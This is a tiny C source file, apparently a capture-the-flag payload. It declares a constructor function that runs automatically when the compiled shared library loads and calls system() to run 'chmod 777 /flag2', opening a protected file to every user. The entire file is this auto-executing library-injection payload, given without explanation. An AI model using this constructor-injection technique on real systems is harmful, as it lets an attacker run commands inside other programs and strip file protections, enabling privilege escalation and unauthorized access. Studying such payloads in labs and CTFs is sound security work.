#include <stdio.h>
#include <stdlib.h>

void __attribute__((constructor)) _my_init(void) {
	system("chmod 777 /flag2");
}
